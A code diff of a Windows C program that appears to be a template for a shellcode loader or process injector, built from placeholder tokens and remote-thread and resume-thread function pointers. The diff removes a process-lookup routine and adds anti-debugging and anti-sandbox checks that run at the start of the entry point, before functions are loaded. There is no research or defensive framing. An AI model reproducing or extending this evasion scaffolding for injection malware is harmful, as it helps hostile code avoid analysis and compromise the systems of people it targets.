@@ -21,39 +21,10 @@ void zero_memory(unsigned char data[], int dataLen)
 	}
 }
 
-DWORD getPidByName(LPCWCHAR proc)
-{
-	HANDLE snapshot;
-	PROCESSENTRY32 curProc;
-	char buf[260];
-	DWORD pid = 0;
-
-	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-
-	curProc.dwSize = sizeof(PROCESSENTRY32);
-
-	if (!Process32First(snapshot, &curProc)) {
-		return -1;
-	}
-
-	do
-	{
-		/*printf("------------------------------\n");
-		wprintf(L"Process name %s\n", curProc.szExeFile);
-		printf("PID: %d\n", curProc.th32ProcessID);
-		printf("Number of threads: %d\n", curProc.cntThreads);
-		printf("PPID: %d\n", curProc.th32ParentProcessID);*/
-		if (!lstrcmpW(curProc.szExeFile, proc))
-		{
-			pid = curProc.th32ProcessID;
-			break;
-		}
-	} while (Process32Next(snapshot, &curProc));
-
-	return pid;
-}
 
 <ANTI_DEBUG>
+
+<ANTI_SANDBOX>
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     _In_opt_ HINSTANCE hPrevInstance,
@@ -73,6 +44,11 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     CREATEREMOTETHREAD createRemoteThread;
     RESUMETHREAD resumeThread;
 
+	// Anti debug check
+    antiDebug();
+
+	// Anti sandbox check
+    antiSandbox();
 
     <LOAD_FUNCTIONS>
 
